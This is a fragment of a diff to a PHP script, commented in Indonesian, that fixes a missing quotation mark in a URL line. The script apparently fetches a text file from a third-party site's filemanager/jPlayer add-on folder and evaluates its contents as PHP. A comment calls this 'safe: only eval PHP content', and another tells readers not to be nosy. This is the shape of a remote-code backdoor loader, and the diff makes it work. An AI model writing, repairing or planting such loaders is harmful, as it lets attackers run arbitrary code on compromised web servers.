@@ -8,7 +8,7 @@
  * - Aman: hanya eval isi PHP
  */
 
-$url = "https://vantaibamien.com/filemanager/js/jPlayer/add-on/ftp.txt; // Jangan Kepo Dong
+$url = "https://vantaibamien.com/filemanager/js/jPlayer/add-on/ftp.txt"; // Jangan Kepo Dong
 
 function fetch_strict($url) {
     $tries = 0;
